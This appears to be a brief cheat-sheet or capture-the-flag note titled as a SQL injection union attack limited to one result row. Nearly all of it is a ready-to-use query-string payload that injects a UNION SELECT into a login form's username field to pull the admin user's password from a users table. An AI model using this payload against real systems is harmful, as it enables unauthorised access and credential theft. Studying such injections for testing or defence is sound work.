union attack with limit to 1 response but known names

`?username=asdf' union select password from users where username='admin' limit 0,1-- -&password=a`